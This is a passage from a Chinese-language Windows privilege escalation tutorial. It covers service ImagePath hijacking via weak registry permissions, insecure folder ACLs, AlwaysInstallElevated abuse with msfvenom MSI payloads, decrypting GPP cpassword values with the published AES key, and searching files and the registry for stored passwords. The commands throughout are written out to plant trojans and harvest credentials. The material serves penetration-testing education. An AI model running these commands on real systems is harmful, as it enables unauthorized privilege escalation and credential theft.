    C:\Users\user\Desktop>
要强制重新启动，可以重新启动系统，或者可以通过社工管理员或管理自己重新启动系统。
该服务还可能在启动时抛出错误消息：
    C:\Users\user\Desktop>sc start "ServiceName"
    sc start "ServiceName"
    [SC] StartService FAILED 1053:
    The service did not respond to the start or control request in a timely fashion.
    C:\Users\user\Destkop>
当Windows执行服务时，它们应与Windows服务控制管理器通信。如果不这样做，`SCM`就会杀死这个进程。通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。
### 注册表
以下是通过注册表识别漏洞的一些方法。
注册表由一系列`配置单元`或`配置集合`组成。它们按以下方式分解：
  * HKEY_CLASSES_ROOT - 文件类型的默认应用程序
  * HKEY_CURRENT_USER - 当前用户的个人资料
  * HKEY_LOCAL_MACHINE - 系统配置信息
  * HKEY_USERS - 系统用户配置文件
  * HKEY_CURRENT_CONFIG - 系统启动硬件配置文件
可以从命令行调用注册表，也可以使用GUI工具Regedit进行交互
[SUBINACL](https://www.microsoft.com/en-us/download/details.aspx?id=23510)工具有助于检查注册表项，但它必须被部署为一个.msi。如果系统`AlwaysInstallElevated`没有配置错误，则低权限用户无法使用更高权限安装`.msi`。（有关AlwaysInstallElevated的详细信息，请参阅后面的部分。）  
例如，要使用SubInACL查询易受攻击的服务：
    C:\Users\user\Desktop>subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Service" /display
    subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
    SeSecurityPrivilege : Access is denied.
    WARNING :Unable to set SeSecurityPrivilege privilege. This privilege may be required. 
    ===============================================================================
    +KeyReg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Service
    ===============================================================================
    /control=0x400 SE_DACL_AUTO_INHERITED-0x0400 
    /owner             =builtin\administrators
    /primary group     =system
    /perm. ace count   =10
    /pace =everyone     ACCESS_ALLOWED_ACE_TYPE-0x0
      CONTAINER_INHERIT_ACE-0x2      
        Key and SubKey - Type of Access:
      Full Control
        Detailed Access Flags :
      KEY_QUERY_VALUE-0x1        KEY_SET_VALUE-0x2          KEY_CREATE_SUB_KEY-0x4     
      KEY_ENUMERATE_SUB_KEYS-0x8 KEY_NOTIFY-0x10            KEY_CREATE_LINK-0x20       DELETE-0x10000             
      READ_CONTROL-0x20000       WRITE_DAC-0x40000          WRITE_OWNER-0x80000        
    C:\Users\user\Desktop>
在上面的例子中，everyone给出了full control。
也可以使用AccessChk工具查询注册表。  
一旦发现有漏洞的配置，就可以将木马放入服务的ImagePath中。
    C:\Users\user\Desktop>reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\Desktop\malicious.exe" /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\Desktop\malicious.exe" /f
    The operation completed successfully.
    C:\Users\user\Desktop>
与上面情况一样，必须重新启动服务才能运行木马。  
即使系统上的所有服务都是封闭的，注册表也可能会出现其他漏洞。可能会保存凭据或其他信息，或者可以调整配置。此外，`reg`命令还可用于本地保存注册表配置单元，以便使用`RegRipper`等工具进行散列破解，`SAM文件`提取和静态分析。
### 不安全的文件系统权限
管理员通常为某些路径配置自由权限，以避免潜在的访问错误。这可以提供一种简单的利用途径，因此考虑与服务和服务二进制文件关联的文件系统权限是关键。
在配置错误的Windows服务的情况下，可能存在服务可执行文件的路径被完全引用并且服务权限被限制但实际二进制文件本身就不安全。  
For example:
    C:\Program Files (x86)\Program Folder>icacls "C:\Program Files (x86)\Program\Service Folder"
    icacls "C:\Program Files (x86)\Program\Service Folder"
    C:\Program Files (x86)\Program\Service Folder Everyone:(OI)(CI)(F)
                                                      Everyone:(I)(OI)(CI)(F)
                                                      NT SERVICE\TrustedInstaller:(I)(F)
                                                      NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                                      NT AUTHORITY\SYSTEM:(I)(F)
                                                      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                                      BUILTIN\Administrators:(I)(F)
                                                      BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                                      BUILTIN\Users:(I)(RX)
                                                      BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                                      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
    Successfully processed 1 files; Failed processing 0 files
    C:\Program Files (x86)\Program Folder>
在上面的例子中，`Everyone`具有路径的完全控制权限（F）。
还可以使用AccessChk工具调查文件系统权限。  
默认情况下，所有经过身份验证的用户都可以写入安装在根`C:\`目录中的软件目录。例如，Ruby，Perl和Python等脚本语言或Landesk或Marimba等远程管理工具的目录。系统安装后创建的目录通常也是可写的。`C:\root`中的可写目录可能位于应用程序的路径中，这意味着二进制文件或`.dll`之类的项也可以注入其路径中。
### AlwaysInstallElevated
`AlwaysInstallElevated`是一种允许非管理用户以SYSTEM权限运行`Microsoft
Windows`安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。  
可以通过查询以下注册表项来识别此设置：
    [HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001
例如，通过使用`reg query`命令：
    C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
or:
    C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
如果存在漏洞，上面将输出以下内容：
    C:\Users\user\Desktop>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
    C:\Users\user\Desktop>
如果系统没这个漏洞，它将输出错误：
    C:\Users\user\Desktop>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    ERROR: The system was unable to find the specified registry key or value.
    C:\Users\user\Desktop>
如果系统配置了AlwaysInstallElevated，则可以利用它来提升权限。
可以使用msfvenom创建恶意.msi文件。选择所需的payload并设置使用`-f msi`将输出格式设置为MSI。  
然后可以使用[msiexec](https://msdn.microsoft.com/en-us/library/aa367988.aspx)在易受攻击的系统上执行攻击代码。
### 组策略首选项漏洞
组策略首选项（GPP）与附加到域的计算机的基于Server 2008策略的配置一起发布。
客户端计算机定期使用当前登录用户的帐户凭据进行域控制，以进行身份​​验证，然后生成配置策略。  
可用于软件部署，配置启动脚本，映射网络共享，配置注册表配置单元，配置打印机，管理安全权限等。还可以为本地管理员帐户配置密码。
这些策略文件存储在域控制器的`SYSVOL`共享中的一系列.xml文件中。
路径通常是这样的：
    \\REMOTE_HOST\SYSVOL\REMOTE_HOST\Policies\{POLICY_ID}\Machine\Preferences\
可能存在以下配置文件：
    Services\Services.xml
    ScheduledTasks\ScheduledTasks.xml
    Printers\Printers.xml
    Drives\Drives.xml
    DataSources\DataSources.xml
这些配置文件可能包含名为“cpassword”的配置选项，用于配置帐户的密码。这些密码使用32字节AES密钥 加密 ：
    4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
     f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
此漏洞已通过MS14-025解决，但此修补程序仅阻止创建新策略，并且包含凭据的任何旧版GPP仍然容易受到攻击。  
破解密码可以使用该配置访问计算机的本地管理员帐户，这可以通过Kali中的`gpp-decrypt`命令完成：
    root@kali:~# gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
    Local*P4ssword!
### 凭证窃取(读书人怎么能叫窃呢)
在主机上可以找到一些密码：
    unattend.xml
    GPP.xml
    SYSPREP.INF
    sysprep.xml
    其他各种配置文件
    日志文件
    注册表项
    文件如my_passwords.txt，my_passwords.xls等
还可以搜索文件系统以查找常见的敏感文件。
ps：个人愚见，提权就是看你信息收集的全面不全面
    C:\Users\user\Desktop> dir C:\*vnc.ini /s /b /c
或者在名称中包含关键词的项目：
    C:\Users\user\Desktop> dir C:\ /s /b /c | findstr /sr \*password\*
或者可以在文件内容中搜索`password`之类的关键字：
    C:\Users\user\Desktop>findstr /si password \*.txt | \*.xml | \*.ini
可以查询注册表，例如，字符串`password`：
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
系统管理员可能有包含凭据的配置文件。`unattend.xml`文件用于自动化软件部署，并包含纯文本（base64编码）凭据。此外，已知一些用户将其密码保存在纯文本文件中是为了方便而忽视了安全性。
### 令牌权限
可以在以下系统中滥用这些令牌：
    Microsoft Windows XP Professional SP3和之前版本
    Windows Server 2003 SP2和之前的版本
    Windows Server 2003 x64和x64 SP2
    Windows Server 2003（用于基于Itanium的系统SP2和先前版本）
    Windows Server 2008
    Windows Server 2008 x64
    Windows Server 2008（用于基于Itanium的系统）
    Windows Vista SP1和之前的版本
    Windows Vista x64 SP1和之前的版本
帐户有许多可利用的令牌权限：
    SeImpersonatePrivilege